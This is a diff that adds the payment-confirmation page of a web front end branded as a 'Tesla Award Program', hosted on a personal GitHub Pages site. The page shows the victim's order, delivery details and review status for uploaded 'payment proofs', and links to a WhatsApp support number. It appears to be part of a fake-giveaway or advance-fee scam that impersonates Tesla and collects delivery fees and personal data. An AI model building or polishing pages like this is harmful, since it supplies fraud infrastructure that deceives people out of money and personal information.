@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Confirmation — Tesla Award Program</title>
+  <meta name="description" content="Your payment has been submitted for review. Track the status of your Tesla vehicle order.">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="canonical" href="https://joshbond123.github.io/Tesla/payment-confirmation.html">
+  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    :root {
+      --red: #E31937; --red-dark: #c41030; --success: #00A550; --warning: #F59E0B; --danger: #EF4444;
+      --dark: #0A0A0A; --dark2: #171A20; --gray: #5C5E62; --gray2: #8E9099; --gray3: #C4C7CC;
+      --border: #E5E7EB; --bg: #F5F5F7; --white: #FFFFFF;
+    }
+    *,*::before,*::after{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{background:var(--bg);font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;color:var(--dark2);margin:0;padding:0;-webkit-font-smoothing:antialiased}
+    
+    .topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(255,255,255,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid var(--border);height:64px;display:flex;align-items:center;padding:0 28px}
+    .topbar-brand{display:flex;align-items:center;gap:10px;font-size:16px;font-weight:800;color:var(--dark);text-decoration:none;letter-spacing:-0.3px}
+    .topbar-brand img{height:28px}
+    
+    .page-wrap{max-width:760px;margin:0 auto;padding:88px 20px 80px}
+    
+    .status-banner{text-align:center;margin-bottom:32px;padding:40px 32px;border-radius:20px;position:relative;overflow:hidden}
+    .status-banner::before{content:'';position:absolute;top:0;left:0;right:0;height:4px}
+    .status-banner.pending{background:linear-gradient(135deg,rgba(245,158,11,0.06),rgba(245,158,11,0.02));border:1.5px solid rgba(245,158,11,0.2)}
+    .status-banner.pending::before{background:linear-gradient(90deg,#F59E0B,#fbbf24)}
+    .status-banner.approved{background:linear-gradient(135deg,rgba(0,165,80,0.06),rgba(0,165,80,0.02));border:1.5px solid rgba(0,165,80,0.2)}
+    .status-banner.approved::before{background:linear-gradient(90deg,#00A550,#00C853)}
+    .status-banner.rejected{background:linear-gradient(135deg,rgba(239,68,68,0.06),rgba(239,68,68,0.02));border:1.5px solid rgba(239,68,68,0.2)}
+    .status-banner.rejected::before{background:linear-gradient(90deg,#EF4444,#f87171)}
+    
+    .status-icon{width:72px;height:72px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:32px}
+    .pending .status-icon{background:rgba(245,158,11,0.12);color:#F59E0B}
+    .approved .status-icon{background:rgba(0,165,80,0.12);color:#00A550}
+    .rejected .status-icon{background:rgba(239,68,68,0.12);color:#EF4444}
+    
+    .status-title{font-size:28px;font-weight:900;color:var(--dark);margin:0 0 8px;letter-spacing:-0.5px}
+    .status-message{font-size:15px;color:var(--gray);line-height:1.65;max-width:480px;margin:0 auto}
+    
+    .card{background:var(--white);border-radius:18px;border:1px solid var(--border);box-shadow:0 2px 12px rgba(0,0,0,0.04);overflow:hidden;margin-bottom:20px}
+    .card-header{padding:20px 24px;border-bottom:1px solid rgba(0,0,0,0.05);display:flex;align-items:center;gap:10px}
+    .card-header h2{font-size:15px;font-weight:700;margin:0;color:var(--dark)}
+    .card-header svg{color:var(--red);flex-shrink:0}
+    .card-body{padding:20px 24px}
+    
+    .car-img-wrap{text-align:center;padding:24px;background:linear-gradient(180deg,rgba(0,0,0,0.02),rgba(0,0,0,0));border-radius:12px;margin-bottom:16px}
+    .car-img-wrap img{max-width:280px;width:100%;height:auto}
+    .car-img-wrap .car-name{font-size:20px;font-weight:800;color:var(--dark);margin-top:12px}
+    .car-img-wrap .car-detail{font-size:13px;color:var(--gray2);margin-top:2px}
+    
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px 20px}
+    @media(max-width:480px){.info-grid{grid-template-columns:1fr}}
+    .info-row{display:flex;justify-content:space-between;align-items:flex-start;padding:8px 0;border-bottom:1px solid rgba(0,0,0,0.04);gap:12px;font-size:13px}
+    .info-row:last-child{border-bottom:none}
+    .ir-label{color:var(--gray);font-weight:500;flex-shrink:0}
+    .ir-value{color:var(--dark2);font-weight:600;text-align:right}
+    
+    .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:10px;font-size:14px;font-weight:700;padding:12px 24px;border:none;cursor:pointer;font-family:inherit;transition:all 0.2s ease;text-decoration:none}
+    .btn-primary{background:var(--red);color:white;box-shadow:0 4px 16px rgba(227,25,55,0.3);width:100%}
+    .btn-primary:hover{background:var(--red-dark);transform:translateY(-2px);box-shadow:0 8px 24px rgba(227,25,55,0.4)}
+    .btn-outline{background:white;color:var(--dark2);border:1.5px solid var(--border)}
+    .btn-outline:hover{border-color:var(--red);color:var(--red)}
+    .btn-ghost{background:none;color:var(--gray2);border:1.5px solid var(--border);width:100%}
+    .btn-ghost:hover{border-color:var(--red);color:var(--red)}
+    
+    .whatsapp-float{position:fixed;bottom:28px;right:28px;z-index:99999;display:flex;flex-direction:column;align-items:center;gap:10px}
+    .whatsapp-label{background:white;color:#171a20;font-size:12px;font-weight:600;padding:7px 12px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1);white-space:nowrap}
+    .whatsapp-btn{width:54px;height:54px;background:#25D366;border-radius:16px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(37,211,102,0.3);text-decoration:none}
+    .whatsapp-btn:hover{transform:scale(1.06)}
+    
+    @media(max-width:560px){.page-wrap{padding:88px 14px 60px}.status-banner{padding:28px 18px}}
+  </style>
+</head>
+<body>
+<header class="topbar">
+  <a class="topbar-brand" href="dashboard.html">
+    <img src="assets/tesla-award-logo.svg" alt="Tesla" onerror="this.style.display='none'">
+    Tesla Award Program
+  </a>
+</header>
+<div class="page-wrap">
+  <div class="status-banner pending" id="statusBanner">
+    <div class="status-icon" id="statusIcon">⏳</div>
+    <h1 class="status-title" id="statusTitle">Payment Proof Received</h1>
+    <p class="status-message" id="statusMessage">Your payment proof has been received and is currently under review. We will notify you once it has been verified.</p>
+  </div>
+  <div class="card">
+    <div class="card-header">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2"><path d="M5 17a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v1a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1v-1Z"/><path d="M5 17V9a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v8"/></svg>
+      <h2>Order Summary</h2>
+    </div>
+    <div class="card-body">
+      <div class="car-img-wrap">
+        <img id="carImage" src="" alt="Tesla vehicle" onerror="this.style.display='none'">
+        <div class="car-name" id="carName">Loading...</div>
+        <div class="car-detail" id="carDetail"></div>
+      </div>
+      <div class="info-grid" id="orderInfo"></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+      <h2>Delivery Information</h2>
+    </div>
+    <div class="card-body"><div class="info-grid" id="deliveryInfo"></div></div>
+  </div>
+  <div id="actionSection" style="margin-top:8px;">
+    <button class="btn btn-primary" onclick="window.location.href='track.html'" id="trackBtn">Track Your Order →</button>
+  </div>
+</div>
+<script src="js/config.js"></script>
+<script src="js/app.js"></script>
+<script>
+(function(){'use strict';
+function esc(s){return s==null?'':String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+var confData=JSON.parse(localStorage.getItem('tesla_payment_confirmation')||'null');
+var sessionToken=localStorage.getItem('tesla_session_token')||'';
+var submittedFlag=localStorage.getItem('tesla_payment_submitted');
+if(!confData){
+  var car=JSON.parse(localStorage.getItem('tesla_selected_car')||'null');
+  var delivery=JSON.parse(localStorage.getItem('tesla_delivery_details')||'null');
+  var method=JSON.parse(localStorage.getItem('tesla_delivery_method')||'null');
+  if(car||delivery){confData={car:car,delivery:delivery,deliveryMethod:method,orderId:'ORD-'+Date.now().toString(36).toUpperCase(),timestamp:new Date().toISOString(),status:'pending',sessionToken:sessionToken};}
+}
+if(!confData&&sessionToken){
+  var A=window.TESLA_API_BASE||'';if(A){fetch(A+'/session?token='+encodeURIComponent(sessionToken)).then(function(r){return r.json()}).then(function(d){if(d.valid&&d.hasOrder&&d.order){confData={car:d.order.selectedCar,delivery:d.order.deliveryDetails,deliveryMethod:d.order.deliveryMethod,orderId:d.order.orderId,timestamp:d.order.orderDate,status:'pending',sessionToken:sessionToken};renderPage();}}).catch(function(){renderPage();});}
+}
+function checkPaymentStatus(){
+  var A=window.TESLA_API_BASE||'';var oid=confData?confData.orderId:'';
+  if(A&&oid){fetch(A+'/payment/status?order_id='+encodeURIComponent(oid)).then(function(r){return r.json()}).then(function(d){if(d.proofs&&d.proofs.length>0){var l=d.proofs[0];if(l.status&&confData){confData.status=l.status;renderStatus();}}}).catch(function(){});}
+}
+function renderPage(){if(!confData){document.getElementById('statusTitle').textContent='No Order Found';document.getElementById('statusMessage').textContent='Please complete your order first.';document.getElementById('actionSection').innerHTML='<button class=\"btn btn-ghost\" onclick=\"window.location.href=\\'dashboard.html\\'\">Go to Dashboard</button>';return;}renderStatus();renderOrder();renderDelivery();checkPaymentStatus();}
+function renderStatus(){
+  var b=document.getElementById('statusBanner'),i=document.getElementById('statusIcon'),t=document.getElementById('statusTitle'),m=document.getElementById('statusMessage'),a=document.getElementById('actionSection');
+  var s=(confData&&confData.status)||'pending';b.className='status-banner '+s;
+  if(s==='approved'){i.textContent='\u2713';t.textContent='Payment Verified';m.textContent='Your payment has been successfully verified. Your Tesla vehicle is now being prepared for delivery.';a.innerHTML='<button class=\"btn btn-primary\" onclick=\"window.location.href=\\'track.html\\'\">Track Your Order \u2192</button>';}
+  else if(s==='rejected'){i.textContent='\u2715';t.textContent='Payment Not Verified';m.textContent='Your payment proof could not be verified. Please return to the payment page to submit a new payment proof.';a.innerHTML='<button class=\"btn btn-primary\" onclick=\"localStorage.removeItem(\\'tesla_payment_confirmation\\');localStorage.removeItem(\\'tesla_payment_submitted\\');window.location.href=\\'payment.html\\'\" style=\"margin-bottom:10px;\">Return to Payment Page</button><button class=\"btn btn-ghost\" onclick=\"window.location.href=\\'dashboard.html\\'\">Back to Dashboard</button>';}
+  else{i.textContent='\u23F3';t.textContent='Payment Proof Received';m.textContent='Your payment proof has been received and is currently under review.';a.innerHTML='<button class=\"btn btn-primary\" onclick=\"window.location.href=\\'track.html\\'\" style=\"margin-bottom:10px;\">Track Your Order \u2192</button><button class=\"btn btn-ghost\" onclick=\"window.location.href=\\'dashboard.html\\'\">Back to Dashboard</button>';}
+}
+function renderOrder(){
+  var car=confData?(confData.car||{}):{},method=confData?(confData.deliveryMethod||{}):{};
+  var cn=car.name||car.model||'Tesla Vehicle',cc=car.color||'',cv=car.variant||'';
+  document.getElementById('carName').textContent='Tesla '+cn;
+  document.getElementById('carDetail').textContent=[cc,cv].filter(Boolean).join(' \u2014 ')||'';
+  var ci=(car.id||'models').toLowerCase();
+  var im={cybertruck:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',modely:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',models:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',model3:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',modelx:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'};
+  document.getElementById('carImage').src=im[ci]||im['models'];
+  var rows=[{label:'Order ID',value:confData?confData.orderId:'\u2014'},{label:'Car',value:'Tesla '+cn+(cv?' \u2014 '+cv:'')},{label:'Payment Method',value:confData?(confData.paymentMethod||'\u2014'):'\u2014'},{label:'Delivery Method',value:method.name||'\u2014'},{label:'Delivery Fee',value:method.priceDisplay||('$'+(method.price||'0'))},{label:'Submitted',value:confData?new Date(confData.timestamp).toLocaleString():'\u2014'},{label:'Status',value:(confData&&confData.status==='approved'?'\u2713 Approved':confData&&confData.status==='rejected'?'\u2715 Rejected':'\u23F3 Pending')}];
+  document.getElementById('orderInfo').innerHTML=rows.map(function(r){return'<div class=\"info-row\"><span class=\"ir-label\">'+esc(r.label)+'</span><span class=\"ir-value\">'+esc(r.value)+'</span></div>';}).join('');
+}
+function renderDelivery(){
+  var d=confData?(confData.delivery||{}):{};
+  var rows=[{label:'Recipient',value:d.fullName||d.recipientName||'\u2014'},{label:'Email',value:d.email||'\u2014'},{label:'Phone',value:d.phone||d.deliveryPhone||'\u2014'},{label:'Address',value:d.address||'\u2014'},{label:'City',value:d.city||'\u2014'},{label:'State',value:d.state||'\u2014'},{label:'Country',value:d.country||'\u2014'}];
+  document.getElementById('deliveryInfo').innerHTML=rows.map(function(r){return'<div class=\"info-row\"><span class=\"ir-label\">'+esc(r.label)+'</span><span class=\"ir-value\">'+esc(r.value)+'</span></div>';}).join('');
+}
+if(submittedFlag==='true'&&!confData){
+  var proofs=JSON.parse(localStorage.getItem('tesla_payment_proofs')||'[]');
+  if(proofs.length>0){var l=proofs[proofs.length-1];confData={orderId:l.orderId||l.order_id||'\u2014',paymentMethod:l.paymentMethod||l.payment_method||'\u2014',status:l.status||'pending',timestamp:l.createdAt||l.created_at||new Date().toISOString()};}
+}
+renderPage();
+})();
+</script>
+<div class="whatsapp-float">
+  <span class="whatsapp-label">Need help?<br>Chat with us</span>
+  <a href="https://wa.me/15814783495?text=Hi%2C%20I%20need%20support%20with%20my%20Tesla%20Award%20Program%20order." class="whatsapp-btn" target="_blank" rel="noopener noreferrer">
+    <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+  </a>
+</div>
+</body>
+</html>
